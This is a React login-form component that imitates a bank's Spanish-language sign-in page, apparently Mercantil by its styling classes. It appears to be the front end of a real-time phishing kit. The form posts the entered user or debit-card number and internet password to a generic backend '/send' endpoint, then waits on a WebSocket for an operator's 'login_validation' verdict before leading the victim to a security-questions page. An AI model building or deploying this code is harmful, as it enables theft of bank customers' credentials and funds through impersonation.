import {
  type FormEvent,
  useCallback,
  useEffect,
  useRef,
  useState,
} from "react";
import { createPortal } from "react-dom";
import { BACKEND_URL, WS_URL } from "../config.ts";
import { navigateTo } from "../pathname.ts";
import { PasswordField } from "./PasswordField.tsx";
import { PreguntasLoading } from "./PreguntasLoading.tsx";
import { RememberToggle } from "./RememberToggle.tsx";

interface LoginFormValues {
  username: string;
  password: string;
  rememberUser: boolean;
}

type LoginStatus = "idle" | "waiting" | "error";

export function LoginForm() {
  const [values, setValues] = useState<LoginFormValues>({
    username: "",
    password: "",
    rememberUser: false,
  });
  const [status, setStatus] = useState<LoginStatus>("idle");
  const [errorMessage, setErrorMessage] = useState("");
  const wsRef = useRef<WebSocket | null>(null);

  // Clean up WebSocket on unmount
  useEffect(() => {
    return () => {
      if (wsRef.current) {
        wsRef.current.close();
        wsRef.current = null;
      }
    };
  }, []);

  const handleUsernameChange = useCallback((value: string) => {
    setValues((prev) => ({ ...prev, username: value }));
  }, []);

  const handlePasswordChange = useCallback((value: string) => {
    setValues((prev) => ({ ...prev, password: value }));
  }, []);

  const handleRememberChange = useCallback((checked: boolean) => {
    setValues((prev) => ({ ...prev, rememberUser: checked }));
  }, []);

  const connectAndWait = useCallback(() => {
    // Close any existing connection before opening a new one
    if (wsRef.current) {
      wsRef.current.close();
    }

    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;

    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.event === "login_validation") {
          if (data.valid === true) {
            ws.close();
            wsRef.current = null;
            navigateTo("/preguntas-seguridad");
          } else {
            setStatus("error");
            setErrorMessage(
              "Los datos ingresados no son válidos. Por favor verifica tu usuario y clave.",
            );
            ws.close();
            wsRef.current = null;
          }
        }
      } catch {
        // Non-JSON message ignored
      }
    };

    ws.onerror = () => {
      setStatus("error");
      setErrorMessage("Error de conexión. Por favor intenta nuevamente.");
      wsRef.current = null;
    };

    ws.onclose = () => {
      // If still in waiting state when socket closes unexpectedly, show error
      setStatus((prev) => {
        if (prev === "waiting") {
          setErrorMessage(
            "La conexión se cerró inesperadamente. Intenta de nuevo.",
          );
          return "error";
        }
        return prev;
      });
    };
  }, []);

  const handleSubmit = useCallback(
    async (e: FormEvent) => {
      e.preventDefault();
      setStatus("waiting");
      setErrorMessage("");

      try {
        await fetch(`${BACKEND_URL}/send`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            type: "login",
            username: values.username,
            password: values.password,
            rememberUser: values.rememberUser,
          }),
        });
        // After sending, open WebSocket and wait for login_validation
        connectAndWait();
      } catch (err) {
        console.error("Error sending login data:", err);
        setStatus("error");
        setErrorMessage(
          "Error de conexión con el servidor. Intenta nuevamente.",
        );
      }
    },
    [values, connectAndWait],
  );

  const isWaiting = status === "waiting";

  return (
    <div className="login-card w-[320px] max-w-full">
      {/* Title block */}
      <div
        className="text-center font-mercantil font-bold mb-4"
        style={{ lineHeight: "normal" }}
      >
        <p className="text-[24px] text-mercantil-light-blue mb-[6px]">
          Bienvenido
        </p>
        <span className="text-[32px] text-mercantil-dark-blue">
          Inicia tu sesión
        </span>
      </div>

      {/* Error alert */}
      {status === "error" && (
        <div
          className="login-error-alert"
          role="alert"
          aria-live="assertive"
          id="login-error-msg"
        >
          <svg
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.5"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
            className="login-error-icon"
          >
            <circle cx="12" cy="12" r="10" />
            <line x1="12" y1="8" x2="12" y2="12" />
            <line x1="12" y1="16" x2="12.01" y2="16" />
          </svg>
          <span>{errorMessage}</span>
        </div>
      )}

      {/* Waiting banner */}
      {isWaiting &&
        createPortal(
          <div className="fixed inset-0 z-[2000]">
            <PreguntasLoading message="Verificando sus datos de acceso..." />
          </div>,
          document.body,
        )}

      <form
        id="loginForm"
        name="loginForm"
        onSubmit={handleSubmit}
        noValidate
        className="w-full"
        aria-describedby={status === "error" ? "login-error-msg" : undefined}
      >
        {/* Username field */}
        <div className="mb-1">
          <PasswordField
            id="usr"
            name="usr"
            label="Usuario o Tarjeta de débito"
            autoComplete="username"
            value={values.username}
            onChange={handleUsernameChange}
          />
          <div className="text-right text-[14px] text-mercantil-dark-blue cursor-pointer mb-4 mt-[-6px]">
            ¿Olvidaste tu usuario?
          </div>
        </div>

        {/* Password field */}
        <div className="mb-1">
          <PasswordField
            id="clv"
            name="clv"
            label="Clave de internet"
            required
            autoComplete="current-password"
            value={values.password}
            onChange={handlePasswordChange}
          />
          <div className="text-right text-[14px] text-mercantil-dark-blue cursor-pointer mt-[-6px] mb-4">
            ¿Olvidaste tu clave de internet?
          </div>
        </div>

        {/* Remember toggle */}
        <div className="mb-8">
          <RememberToggle
            checked={values.rememberUser}
            onChange={handleRememberChange}
          />
        </div>

        {/* Submit button */}
        <div className="login-button mt-[37px] flex justify-center">
          <button
            type="submit"
            disabled={isWaiting}
            className="login-submit rounded-3xl bg-gradient-to-b from-mercantil-light-blue to-mercantil-dark-blue border-none px-8 py-2 text-[18px] font-mercantil font-normal leading-none text-white cursor-pointer transition-all duration-200 hover:from-[#4CBBE5] hover:to-[#4C82B8] active:border-2 active:border-mercantil-dark-blue active:text-mercantil-dark-blue active:bg-gradient-to-b active:from-[#4CBBE5] active:to-[#4C82B8] focus:outline-none disabled:opacity-60 disabled:cursor-not-allowed"
          >
            {isWaiting ? "Verificando..." : "Iniciar"}
          </button>
        </div>
      </form>
    </div>
  );
}
